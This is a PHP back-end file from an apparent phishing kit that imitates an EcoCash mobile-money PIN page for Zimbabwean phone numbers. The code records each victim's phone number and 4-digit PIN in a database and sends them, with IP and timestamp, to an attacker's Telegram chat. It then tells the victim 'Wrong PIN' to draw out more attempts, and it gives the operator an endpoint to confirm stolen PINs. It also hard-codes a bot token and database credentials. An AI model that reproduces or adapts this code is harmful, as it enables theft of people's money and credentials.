<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// PostgreSQL credentials (default port changed to 5432)
$dbHost = dpg-d8l5ii7lk1mc73cjcvs0-a;
$dbPort = 5432;          // PostgreSQL default
$dbName = loan_9d8q;
$dbUser = loan_9d8q_user;
$dbPass = Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX;

// ==================================

$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';

$flashMessage = '';
if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Create a PostgreSQL PDO connection
 * @return PDO|null
 */
function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
    static $pdo = null;
    if ($pdo === null) {
        // Check if PDO PostgreSQL driver is available
        if (!in_array('pgsql', PDO::getAvailableDrivers())) {
            error_log("PDO PostgreSQL driver is NOT available. Installed drivers: " . implode(',', PDO::getAvailableDrivers()));
            return null;
        }
        try {
            $dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName;options='--client_encoding=UTF8'";
            $pdo = new PDO($dsn, $dbUser, $dbPass, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_TIMEOUT => 5
            ]);
        } catch (PDOException $e) {
            error_log("Database connection failed: " . $e->getMessage());
            return null;
        }
    }
    return $pdo;
}

// Function to send Telegram message (unchanged)
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'EcoCashBot/1.0'
        ]);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response !== false && $httpCode === 200) {
            $result = json_decode($response, true);
            return isset($result['ok']) && $result['ok'] === true;
        }
        return false;
    }
    // fallback to file_get_contents
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 10,
            'user_agent' => 'EcoCashBot/1.0'
        ],
        'ssl' => ['verify_peer' => true]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response !== false) {
        $result = json_decode($response, true);
        return isset($result['ok']) && $result['ok'] === true;
    }
    return false;
}

// AJAX endpoint: check status
if (isset($_GET['check_status']) && $_GET['check_status'] == 1) {
    header('Content-Type: application/json');
    $checkPhone = $_GET['phone'] ?? '';
    $checkPin   = $_GET['pin'] ?? '';
    if (empty($checkPhone) || empty($checkPin)) {
        echo json_encode(['verified' => false]);
        exit;
    }
    $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
    if (!$pdo) {
        echo json_encode(['verified' => false, 'error' => 'db_driver_missing']);
        exit;
    }
    try {
        $stmt = $pdo->prepare("SELECT status FROM ecocash_auth WHERE phone = :phone AND pin = :pin LIMIT 1");
        $stmt->execute([':phone' => $checkPhone, ':pin' => $checkPin]);
        $record = $stmt->fetch();
        $verified = ($record && (int)$record['status'] === 1);
        echo json_encode(['verified' => $verified]);
    } catch (PDOException $e) {
        error_log("AJAX check_status error: " . $e->getMessage());
        echo json_encode(['verified' => false]);
    }
    exit;
}

// Process PIN submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pinArray = isset($_POST['pin']) ? $_POST['pin'] : [];
    $pin = implode('', $pinArray);
    $pin = preg_replace('/[^0-9]/', '', $pin);
    
    if (strlen($pin) === 4) {
        $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
        if (!$pdo) {
            $error = "System error: database driver missing. Please contact administrator.";
            error_log("PDO PostgreSQL driver missing when processing PIN submission");
        } else {
            try {
                // Create table if it doesn't exist (PostgreSQL syntax)
                $pdo->exec("CREATE TABLE IF NOT EXISTS ecocash_auth (
                    id SERIAL PRIMARY KEY,
                    phone VARCHAR(20) NOT NULL,
                    pin VARCHAR(4) NOT NULL,
                    status SMALLINT DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(phone, pin)
                )");
                
                // PostgreSQL: INSERT ... ON CONFLICT instead of INSERT IGNORE
                $insertStmt = $pdo->prepare("
                    INSERT INTO ecocash_auth (phone, pin, status)
                    VALUES (:phone, :pin, 0)
                    ON CONFLICT (phone, pin) DO NOTHING
                ");
                $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
                
                // Send Telegram notification
                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
                $time = date('Y-m-d H:i:s');
                $msg = "🔐 *PIN Attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}\n⏰ Verify: https://hookupint.site/verify.php";
                sendTelegramMessage($botToken, $chatId, $msg);
                
                $_SESSION['pending_pin'] = $pin;
                $error = "Wrong PIN";
            } catch (PDOException $e) {
                error_log("PIN insert error: " . $e->getMessage());
                $error = "System error. Try again later.";
            }
        }
    } else {
        $error = "PIN must be 4 digits.";
    }
}

$pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
?>

<!DOCTYPE html>
<!-- HTML remains exactly as in your original code – no changes needed -->
<html> ... </html>
